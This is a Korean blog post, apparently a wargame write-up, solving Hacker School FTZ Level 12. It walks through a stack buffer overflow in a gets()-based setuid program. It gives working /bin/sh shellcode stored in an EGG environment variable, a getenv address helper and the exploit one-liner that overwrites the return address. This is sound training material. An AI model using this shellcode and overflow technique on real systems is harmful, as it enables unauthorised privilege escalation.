---
layout: post
title: "Hacker School FTZ - Level 12"
description: "Do you know the ?"
comments: true
categories: ftz
---

<img data-action="zoom" src='{{ "assets/ftz/level12/1.jpg" | relative_url }}' alt='relative'>  

## 1) level12/it is like this 입력해 로그인  

<img data-action="zoom" src='{{ "assets/ftz/level12/2.png" | relative_url }}' alt='relative'>  

``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( void )
{
        char str[256];

        setreuid( 3093, 3093 );
        printf( "문장을 입력하세요.\n" );
        gets( str );
        printf( "%s\n", str );
}
```

위의 코드를 보면 level11에서 공격했던 프로그램과 유사합니다.  

level11에서는 argv[1]에 들어 있는 값으로 BOF를 발생시켰다면,  
이번 문제에서는 사용자에게 입력을 받는 취약점을 이용해 BOF를 발생시킵니다.  

입력을 받는 경우 최대 입력 길이를 제한하지 않는 gets의 취약점을 이용한 문제입니다.  

## 2) 간단하게 해당 프로그램 살펴보기  

level11에서 봤던 프로그램과 비슷하기 때문에 간단하게 해당 프로그램을 살펴보겠습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level12/3.png" | relative_url }}' alt='relative'>  

ebp가 가리키는 주소에서 0x108(=264)만큼 떨어진 위치에 str 문자열 배열이 위치합니다.  
즉, str 배열의 시작 주소는 $ebp - 264라고 할 수 있습니다.  


<img data-action="zoom" src='{{ "assets/ftz/level12/4.png" | relative_url }}' alt='relative'>  

get 함수를 call하는 0x080483d2(\*main+66)에 브레이크 포인트를 잡고 ebp 주소와 str 배열의 주소를 알아봤습니다.  
그리고 get 함수가 실행되고 난 뒤 str 배열에 입력된 값을 확인하기 위해 0x080483d7(\*main+71)에도 브레이크 포인트를 설정했습니다.  


<img data-action="zoom" src='{{ "assets/ftz/level12/5_1.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level12/5_2.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level12/5_3.png" | relative_url }}' alt='relative'>  

gets 함수의 인자로 str 배열의 주소가 eax 레지스터에 담겨있기 때문에 레지스터 주소를 확인하여 ebp 주소와 eax 주소를 확인했습니다.  


<img data-action="zoom" src='{{ "assets/ftz/level12/6_1.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level12/6_2.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level12/6_3.png" | relative_url }}' alt='relative'>  

str 배열의 주소와 ebp가 가리키는 주소가 프로그램을 새로 실행할 때마다 달라져도  
str 배열의 주소와 ebp가 가리키는 주소 사이에 0x108 byte 크기만큼 공간이 띄어진 것을 확인했습니다.  


<img data-action="zoom" src='{{ "assets/ftz/level12/7.png" | relative_url }}' alt='relative'>  

``` bash
r <<< $(python -c 'print "AAAA"\*64+"BBBB"+"CCCC"+"DDDD"+"EEEE"')
```

r은 프로그램을 run 한다는 뜻입니다. run을 하면서 사용자의 입력을 미리 입력 받고 있습니다.  

r 뒤에 '<<<'가 의미하는 것은 오른쪽에 단어를 왼쪽 프로그램에게 표준 입력으로 전달하겠다는 의미입니다.
즉, 표준 입력을 리다이렉션 하는 것입니다.  

``` bash
python -c [command]
```

python의 -c 옵션을 사용해 command로 주어지는 파이썬 문장을 실행시킵니다.  

그래서 총 264 byte 문자열("AAAA"\*64+"BBBB"+"CCCC"+"DDDD"+"EEEE")이 str 배열에 입력되었습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level12/8.png" | relative_url }}' alt='relative'>  

gets 함수 실행 전 str 배열에 들어있는 값과 gets 함수 실행 후 str 배열에 들어있는 값을 비교해보면  
gets 함수 실행 후 프로그램 실행 시 입력했던 264 byte 문자열이 입력되어 있는 것을 확인할 수 있습니다.  

gets 함수에서 최대 입력 문자열의 길이를 제한하지 않아 BOF가 발생했습니다.  
str 배열의 길이가 254 byte이지만 264 byte 문자열을 입력 받아 기존에 들어있던 SFP와 RET의 값을 지우고 사용자가 입력한 값으로 채웠습니다.  

return address를 의미하는 RET 위치에  
즉, 0x45454545가 들어있는 주소에 쉘코드가 저장되어 있는 주소를 입력해주면 BOF에 성공합니다.  

## 3) 쉘코드를 어디에 저장?  

위에서 프로그램을 여러 번 실행하면서 str 배열의 주소가 계속해서 바뀌는 것을 확인했습니다.  
str 배열의 주소를 RET 값으로 입력하면 쉘코드를 실행시킬 수 있지만  
str 배열의 주소가 계속해서 바뀌면 RET 주소의 값을 특정하기 어려워집니다.  

이는 메모리 상의 공격을 어렵게 하기 위해 스택, 힙, 라이브러리 등 주소를 랜덤으로 프로세스 주소 공간에 배치해 실행할 때마다 데이터의 주소가 변경되는 기법이 적용됐기 때문입니다.  
즉, ASLR 보호 기법이 적용되어 프로그램이 실행될 때마다 str 배열의 주소가 변경되었습니다.  

level11 문제에서도 ASLR 보호 기법이 적용되어 있어 RET 주소를 변경하며 반복 실행을 했었습니다.  
하지만 ASLR이 적용되어 있어 여러 번 실행해도 쉽게 풀 수 없을 걸로 예상되는데,,,  
그렇다면 ASLR을 우회할 수 있는 더 쉬운 방법은 없을까요?  

<p><a id="env"></a></p>
## 4) 환경 변수 사용하기  

환경 변수는 프로그램을 실행하기 위한 환경 정보를 담고 있습니다.  
> 환경 변수란? 
프로세스가 컴퓨터에서 동작하는 방식에 영향을 미치는 동적인 값들의 모임이다. 
즉, 쉘에서 실행되는 프로그램에 데이터를 전달하는 시스템 내에 저장된 변수이다.  
일반적으로 사용되는 환경변수로는 HOME, PATH, SHELL, USER, bASH, UID, USERNAME 등이 있다.  


환경 변수를 확인하기 위해 env 명령어를 사용하면 됩니다.  
echo $\[환경 변수 이름\]을 입력해 환경 변수 값을 출력하고,  
export \[환경 변수 이름\]을 입력해 환경 변수를 새로 만들거나 수정할 수 있습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level12/9.png" | relative_url }}' alt='relative'>  

'ls', 'pwd', 'cd' 명령어를 절대경로로 입력하지 않고도 사용가능한 이유도  
PATH라는 환경 변수에 명령어가 저장되어 있는 디렉토리 주소(/bin/)가 명시되어 있기 때문입니다.  

쉘코드를 환경 변수에 등록해놓고 RET 주소에 쉘코드가 저장되어 있는 환경 변수 주소를 입력하는 것을 EggShell이라고 합니다.  
일반적으로 입력의 크기 또는 버퍼의 크기가 쉘코드의 크기보다 작아서 쉘코드를 입력할 수 없을 때 사용하는 방법입니다.  

이번 문제에서는 입력의 크기도 제한이 없고 버퍼도 쉘코드의 크기보다 크지만 RET 주소를 정확하게 특정하기 위해 EggShell 방법을 사용할 것입니다.   
그래서 환경 변수 이름을 EGG로 지정하여 환경 변수에 쉘코드를 저장한 뒤, EGG 환경 변수가 저장된 위치를 확인했습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level12/10.png" | relative_url }}' alt='relative'>  

``` bash
export EGG=`python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` bash
echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

<img data-action="zoom" src='{{ "assets/ftz/level12/11.png" | relative_url }}' alt='relative'>  

EGG 환경 변수 값이 저장되어 있는 주소는 그림과 같고 해당 환경 변수에는 쉘코드가 저장되어 있습니다.  

## 5) BOF 시도하기  

쉘코드가 저장되어 있는 주소 위치도 찾았으니 BOF 공격을 시도하겠습니다.  

str 배열(254 bytes) + dummy (8 bytes) + SFP (4 bytes) = 268 bytes 이므로  
NOP으로 268 byte를 채우고 RET에 EGG 환경 변수 위치한 주소(=쉘코드가 저장된 주소)를 입력합니다.  

리틀 엔디언 방식으로 저장되기 때문에 0xbffffc88를 입력할 때는 \x88\xfc\xff\xbf로 입력해야 합니다.  

표준 입력을 받는 부분(gets)에 대한 내용을 프로그램 실행 시 입력하기 위해 파이프라인('|')을 사용합니다.   

``` bash
(python -c 'print "\x90"*268+"\x88\xfc\xff\xbf"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level12/12.png" | relative_url }}' alt='relative'>  

환경 변수를 이용하니 여러 번 반복 수행할 필요없이 깔끔하게 풀 수 있었습니다.  